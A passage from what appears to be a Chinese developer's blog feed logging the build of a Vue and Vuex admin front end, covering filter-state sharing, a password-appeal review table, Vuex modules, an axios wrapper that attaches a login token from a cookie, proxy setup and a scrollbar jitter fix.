class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;$store.state.period&quot;</span><br></code></pre></td></tr></table></figure><p>但是这个就必然会有一定的问题，首先是异步性</p><p>仓库页面写入的筛选条件会显示在订阅系统的页面上</p><p>为了避免异步我们可以不使用同一组数据</p><p>但是面临的问题就是数据绑定怎么做</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">v-model=<span class="hljs-string">&quot;name&quot;</span><br><br>data()&#123;<br>return&#123;<br>name:&#x27;&#x27;<br>&#125;<br>&#125;<br><br>watch:&#123;<br>//name需要随flag的变化在name（仓库的筛选）和sub_name（订阅系统的筛选）中切换<br>//还需要做出一个双向绑定，解决数据交互的问题，this.name改变需要通知<span class="hljs-keyword">state</span>.name || <span class="hljs-keyword">state</span>.sub_name<br>  <span class="hljs-keyword">state</span>.name || <span class="hljs-keyword">state</span>.sub_name 改变也需要通知 this.name<br> &#125;<br></code></pre></td></tr></table></figure><p>这样虽然更改准确，但是代码量大大增加</p><p>于是我偷了一个小懒，实际上这里的异步并不会让客户知道，因为客户在一个时间只会看一个页面</p><p>所以，在订阅或者仓库页面切换的时候，我们只需要清空筛选条件就可以了</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pf">//仓库组件<br>  mounted() &#123;<br>    //页面切换数据置空<br>    this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.name = <span class="hljs-string">&quot;&quot;</span>;<br>    this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.bookName = <span class="hljs-string">&quot;&quot;</span>;<br>    this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.period = <span class="hljs-string">&quot;&quot;</span>;<br>  &#125;,<br><br>//订阅组件同理<br></code></pre></td></tr></table></figure><h3 id="3-第三是用于筛选的数据"><a href="#3-第三是用于筛选的数据" class="headerlink" title="3.第三是用于筛选的数据"></a>3.第三是用于筛选的数据</h3><p>因为过滤器的原因我们组件需要一个副本数组<code>subarr</code>，但是在组件复用之后我们需要对<code>subarr</code>中的内容进行切换</p><p>在仓库组件中<code>subarr</code>是仓库数据<code>bookData</code>的副本</p><p>在订阅组件中<code>subarr</code>是订阅数据<code>bookList</code>的副本</p><p>所以这里使用watch进行一个监视</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pf">watch: &#123;<br>  Flag: &#123;<br>    immediate: true,<br>    handler() &#123;<br>      //监视Flag，Flag改变时改变subarr数组,name,bookName,period<br>      this.subarr = this.Flag<br>        ? this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.bookData<br>        : this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.bookList;<br>    &#125;,<br>  &#125;,<br>&#125;,<br><br></code></pre></td></tr></table></figure><p>及时的切换我们的数据</p><h2 id="4-密码申诉页面"><a href="#4-密码申诉页面" class="headerlink" title="4.密码申诉页面"></a>4.密码申诉页面</h2><p>这个页面主要用于处理用户提交的密码申诉</p><p><img src="https://s2.loli.net/2022/07/31/8YNkPDO3Gt7M9TL.png" alt="密码申诉页面.png"></p><p>一如既往的查找，同意or拒绝，还有全选同意和拒绝</p><p>首先我们需要控制凭证图片的大小，通过<code>:src</code>拿到每一行的图片地址，再通过<code>style</code>属性修改图片的高宽，通过<code>:preview-src-list</code>设置点击图片后的展示效果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-table-column</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">&quot;img&quot;</span> <span class="hljs-attr">label</span>=<span class="hljs-string">&quot;凭证&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;450&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">el-image</span></span><br><span class="hljs-tag">      <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 50%; height: 150px&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;scope.row.img&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">:preview-src-list</span>=<span class="hljs-string">&quot;[scope.row.img]&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;scope.row.num&quot;</span></span><br><span class="hljs-tag">    &gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">slot</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;image-slot&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-picture-outline&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">el-image</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">el-table-column</span>&gt;</span><br></code></pre></td></tr></table></figure><p>同意和拒绝绑定改变条目的审核状态</p><p>点击全选时，隐藏同意和拒绝两个按钮，待处理条目出现一个checkbox代表被勾选</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">sleAll</span>(<span class="hljs-params"></span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.checked == <span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-comment">//点击开启全选</span><br>    <span class="hljs-built_in">this</span>.$store.state.pwdList.forEach(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>      item.checked = <span class="hljs-literal">true</span>;<br>    &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//点击关闭全选</span><br>    <span class="hljs-built_in">this</span>.$store.state.pwdList.forEach(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> &#123;<br>      item.checked = <span class="hljs-literal">false</span>;<br>    &#125;);<br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>所以这里的<code>v-show</code>的隐藏条件就需要考虑一下，按钮需要在待取件状态和没有打开全选的状态下才显示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span></span><br><span class="hljs-tag">  @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;agree(scope.row)&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;scope.row.pwd_Statement == &#x27;待处理&#x27; &amp;&amp; !scope.row.checked&quot;</span></span><br><span class="hljs-tag">  &gt;</span>同意<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span><br></code></pre></td></tr></table></figure><p>同样，勾选框就需要在打开全选和状态为待处理的情况下显示</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;scope.row.checked &amp;&amp; scope.row.pwd_Statement == &#x27;待处理&#x27;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="5-vuex的模块化"><a href="#5-vuex的模块化" class="headerlink" title="5.vuex的模块化"></a>5.vuex的模块化</h2><p>到现在为止我们vuex的数据都是放在一块的，这样子显得数据十分冗杂，所以我们现在将vuex的数据按照组件进行分类</p><p> 将对应的函数和数据放入store中新建的文件中</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\vuex模块化.png" alt="vuex模块化"></p><p>然后在<code>index.js</code>中引入各个vuex模块并暴露出来</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pf">import <span class="hljs-keyword">user</span>Manage <span class="hljs-keyword">from</span> &#x27;./<span class="hljs-keyword">user</span>Manage&#x27;<br>import storeManage <span class="hljs-keyword">from</span> &#x27;./storeManage&#x27;<br><br>export <span class="hljs-keyword">default</span> new Vuex.Store(&#123;<br>    actions,<br>    mutations,<br>    <span class="hljs-keyword">state</span>,<br>    getters,<br>    modules: &#123; <span class="hljs-keyword">user</span>Manage, storeManage &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>此时如果要引用各个vuex模块中的数据，就需要加上<code>modules</code>的名字</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">:<span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$store</span>.state.storeManage.bookData&quot;</span><br></code></pre></td></tr></table></figure><h3 id="1-模块数据的署名问题"><a href="#1-模块数据的署名问题" class="headerlink" title="1.模块数据的署名问题"></a>1.模块数据的署名问题</h3><p>这里在组件中原来绑定的<code>state.bookData</code>现在就需要改为<code>state.storeManage.bookData</code></p><p>而在store中的index.js中如果需要使用bookData，我们就需要改为<code>storeManage.bookData</code></p><p>因为vuex模块化在组件使用的时候是帮我们做了一个集成的操作，此时所有模块的数据都放在了state下，依靠模块名进行分类</p><p>而在index.js中还没有集成，获取数据是依靠引入的模块，所以需要先写下是什么模块下的数据</p><h2 id="6-request"><a href="#6-request" class="headerlink" title="6.request"></a>6.request</h2><h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1.配置文件"></a>1.配置文件</h3><p>我们向后端发送请求可以通过request进行</p><p>在src下新建一个api文件夹</p><p><img src="https://s2.loli.net/2022/07/31/hrb7zGi5uXTCKWA.png" alt="request.png"></p><p>在index.js文件夹中写入，主要是用于发送请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//当前模块对所有接口进行统一管理</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./request&quot;</span>;<br><br><span class="hljs-comment">//管理员登录接口</span><br><span class="hljs-comment">///admin/login post admin</span><br><br><span class="hljs-comment">//post请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> reqUserLogin = <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> requests(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27; /user/findAllUser&#x27;</span>,<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;post&#x27;</span>,data&#125;)<br><span class="hljs-comment">//get请求，传递params参数</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> getUserList = <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> requests(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/user/findAllUser&#x27;</span>,<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;get&#x27;</span>,params&#125;)<br></code></pre></td></tr></table></figure><p>在request.js文件中写入，用于封装axios，添加拦截器，修改请求头（添加token），token存在了store和cookie中，这里从cookie中拿token，之前在store拿有问题</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> Cookies <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;js-cookie&quot;</span>;<br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;axios&quot;</span>;<br>//axios的封装<br>const requests = axios.create(&#123;<br>    baseURL:<span class="hljs-string">&#x27;&#x27;</span>,<br>    timeout:<span class="hljs-number">5000</span><br>&#125;)<br><br>requests.interceptors.request.use(<span class="hljs-function"><span class="hljs-params">(config)</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">if</span>(Cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>))&#123;<br>        <span class="hljs-regexp">//</span>请求头添加字段<br>        config.headers.Token = Cookies.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> config;<br>&#125;)<br><br>requests.interceptors.response.use(<span class="hljs-function"><span class="hljs-params">(res)</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">return</span> res.data;<br>&#125;,<span class="hljs-function"><span class="hljs-params">(error)</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Promise</span>.reject(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;failed&#x27;</span>))<br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> requests;<br></code></pre></td></tr></table></figure><p>然后我们需要在<code>vue.config.js</code>中配置跨域问题</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>vue.config.js<br><br>module.exports = &#123;<br>    <span class="hljs-regexp">//</span>关闭eslint校验工具<br>    lintOnSave: false,<br>    publicPath: <span class="hljs-string">&quot;/&quot;</span>,<br>    devServer: &#123;<br>        proxy: &#123;<br>            <span class="hljs-regexp">//</span>配置跨域           <br>            <span class="hljs-string">&#x27;&#x27;</span>: &#123;<br>                target: <span class="hljs-string">&#x27;服务器地址&#x27;</span>, <span class="hljs-regexp">//</span>这里后台的地址模拟的;应该填写你们真实的后台接口            <br>                changOrigin: true, <span class="hljs-regexp">//</span>允许跨域            <br>                pathRewrite: &#123;<br>                    <span class="hljs-regexp">/* 重写路径，当我们在浏览器中看到请求的地址   为：          http:/</span><span class="hljs-regexp">/localhost:8080/</span>api<span class="hljs-regexp">/core/g</span>etData/userInfo 时           <br>                    实际上访问的地址是：<br>                    http:<span class="hljs-regexp">//</span><span class="hljs-number">121.121</span>.<span class="hljs-number">67.254</span>:<span class="hljs-number">8185</span><span class="hljs-regexp">/core/g</span>etData<span class="hljs-regexp">/userInfo,因为重写了 /</span>api           */<br>                    <span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>                &#125;<br>            &#125;,<br>        &#125;<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-请求函数"><a href="#2-请求函数" class="headerlink" title="2.请求函数"></a>2.请求函数</h3><p>那么我们需要发送请求时需要在函数前面添加<code>async</code>进行一个<code>promise</code>封装</p><p>发送请求的四种类型：<code>put</code>,<code>delete</code>,<code>post</code>,<code>get</code>对应了<strong>增删改查</strong>四个操作</p><p><code>let result = await reqUserLogin(data)</code> 主要是得到返回的数据</p><p>在有返回成功后code==200，再进行commit</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">userLogin</span>(<span class="hljs-params">&#123;commit&#125;,data</span>)</span>&#123;<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">await</span> reqUserLogin(data)<span class="hljs-comment">//data是需要上传的参数</span><br>    <span class="hljs-comment">//服务器下发token</span><br>    <span class="hljs-keyword">if</span>(result.code == <span class="hljs-number">200</span>)&#123;<br>        commit(<span class="hljs-string">&quot;USERLOGIN&quot;</span>,result.data.token);<br>        Cookie.set(<span class="hljs-string">&#x27;token&#x27;</span>, result.data.token) <span class="hljs-comment">// 第一个是cookie的名称，第二个是传入的值。然后再Cookie中生成了一条数据。</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Promise</span>.reject(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;failed&#x27;</span>))<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-登录页面"><a href="#3-登录页面" class="headerlink" title="3.登录页面"></a>3.登录页面</h3><p>比如运用以上内容我们可以做一个登录页面，在await之后<code>router.push</code>跳转至下一个页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//登录的回调函数</span><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">userLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">const</span> &#123;form&#125; = <span class="hljs-built_in">this</span><br>        form &amp;&amp; <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.$store.dispatch(<span class="hljs-string">&#x27;userLogin&#x27;</span>,form)<br>        <span class="hljs-built_in">this</span>.$router.push(&#123;<br>            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;home&#x27;</span><br>        &#125;)<br>    &#125;<span class="hljs-keyword">catch</span>(error)&#123;<br>        alert(error.message)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-token"><a href="#7-token" class="headerlink" title="7.token"></a>7.token</h2><p> 关于前后端交互的一个内容，众所周知，当我们的需要数据或者提交数据的时候，需要发送一个请求，而token就是请求中需要添加的一个字段</p><h3 id="1-什么是token"><a href="#1-什么是token" class="headerlink" title="1.什么是token"></a>1.什么是token</h3><p>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行请求的一个标识。</p><p>当用户第一次登录后，服务器生成一个token并将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。</p><p>简单token的组成；uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符串。为防止token泄露）。</p><h3 id="2-如何使用token"><a href="#2-如何使用token" class="headerlink" title="2.如何使用token"></a>2.如何使用token</h3><p>我这里将token放在了vuex中，如何将vuex中的token放入Cookie，Cookie中的数据会随请求发个服务器</p><p>操作cookie中的数据就依靠<code>cookie.get/remove/set</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//接口文件中的请求</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> reqUserLogin = <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> requests(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/user/findAllUser&#x27;</span>,<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;post&#x27;</span>,data&#125;)<br><br><span class="hljs-comment">// 引入下载的第三方库</span><br><span class="hljs-keyword">import</span> Cookie <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;js-cookie&quot;</span><br><br>    <span class="hljs-attr">state</span>:&#123;<br>        <span class="hljs-attr">token</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;,<br>    <span class="hljs-attr">mutations</span>:&#123;<br>        <span class="hljs-comment">//设置token</span><br>        <span class="hljs-function"><span class="hljs-title">USERLOGIN</span>(<span class="hljs-params">state,token</span>)</span>&#123;<br>            state.token = token<br>        &#125;,<br>        <span class="hljs-comment">//清除token</span><br>        <span class="hljs-function"><span class="hljs-title">clearToken</span>(<span class="hljs-params">state</span>)</span> &#123;<br>            state.token = <span class="hljs-string">&#x27;&#x27;</span><br>            Cookie.remove(<span class="hljs-string">&#x27;token&#x27;</span>) <span class="hljs-comment">// 通过传入token的名称进行一个清空</span><br>        &#125;,<br>        <span class="hljs-comment">// 获取当前的token</span><br>        <span class="hljs-function"><span class="hljs-title">getToken</span>(<span class="hljs-params">state</span>)</span> &#123;<br>            <span class="hljs-comment">// 如果当前的缓存中有token，那就直接获取；如果没有就从state中获取，下面进行容错处理</span><br>            state.token = state.token || Cookie.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-attr">actions</span> : &#123;<br>        <span class="hljs-comment">//登录,设置token</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">userLogin</span>(<span class="hljs-params">&#123;commit&#125;,data</span>)</span>&#123;<br>            <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">await</span> reqUserLogin(data)<span class="hljs-comment">//返回的data中就有token</span><br>            <span class="hljs-comment">//服务器下发token</span><br>            <span class="hljs-keyword">if</span>(result.code == <span class="hljs-number">200</span>)&#123;<br>                commit(<span class="hljs-string">&quot;USERLOGIN&quot;</span>,result.data.token);<br>                Cookie.set(<span class="hljs-string">&#x27;token&#x27;</span>, result.data.token) <span class="hljs-comment">// 第一个是cookie的名称，第二个是传入的值。然后再Cookie中生成了一条数据。</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">Promise</span>.reject(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;failed&#x27;</span>))<br>            &#125;<br>        &#125;,<br>        <span class="hljs-comment">//用户注册</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">reqUserAdd</span>(<span class="hljs-params">&#123;commit&#125;,user</span>)</span>&#123;<br>            <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">await</span> reqUserAdd(user)<br>            <span class="hljs-keyword">if</span>(result.code == <span class="hljs-number">200</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">Promise</span>.reject(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;failed&#x27;</span>))<br>            &#125;<br>        &#125;,<br>        <span class="hljs-comment">//用户登出</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">userLoginOut</span>(<span class="hljs-params">&#123;commit&#125;</span>)</span>&#123;<br>            commit(<span class="hljs-string">&#x27;clearToken&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>        &#125;<br>    &#125;,<br>    <br>    <br></code></pre></td></tr></table></figure><p>之后我们的请求都需要添加首次登录拿到的token，而且需要在退出登录后清除token保证安全</p><h3 id="3-查看token"><a href="#3-查看token" class="headerlink" title="3.查看token"></a>3.查看token</h3><p>我们在浏览器的network选项卡里面找到发送的请求</p><p><img src="https://s2.loli.net/2022/09/04/LcKYtuNykilQ3Ad.png" alt="token.png"></p><p>这个Authorization中就是我们的token，对于拦截器代码是：<code>config.headers.common[&#39;Authorization&#39;] = Cookies.get(&#39;token&#39;) </code></p><p>但是如果后端是直接在request headers中找token，拦截器代码就是：<code>config.headers.Token = Cookies.get(&#39;token&#39;)</code></p><p>我们的头部会多出一个Token字段，里面就是我们的token</p><h2 id="8-请求"><a href="#8-请求" class="headerlink" title="8.请求"></a>8.请求</h2><p>其实我们常用的请求分为了四类：post，del，put，get对应了增删改查四种操作</p><p>除了get的数据在header中，其他四个的数据都在body里面</p><p>主要注意和后端协商请求方式，注意接口调试</p><h2 id="9-测试"><a href="#9-测试" class="headerlink" title="9.测试"></a>9.测试</h2><h3 id="1-页面抖动"><a href="#1-页面抖动" class="headerlink" title="1.页面抖动"></a>1.页面抖动</h3><p>测试的时候需要一个很诡异的页面抖动：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\抖动代码.png" alt="抖动代码"></p><p>原本的width是100%，但是100%会出现页面右侧滑动栏一直抖动的问题</p><p>在百度一下之后发现可能是这个原因</p><p><img src="D:\新建文件夹\文件\GitHub\pic\收发系统开发日志\抖动原因.png" alt="抖动原因"></p><p>也就是说刚刚好盒子大小和电脑屏幕一样大小，右侧的滚动条不知道改不改出现，产生了出现和不出现的叠加态（bushi）</p><p>总的来说，这个时候把盒子的大小调小一点就可以了。</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TypeScript</title>
    <link href="/2022/07/13/TypeScript/"/>
    <url>/2022/07/13/TypeScript/</url>
    
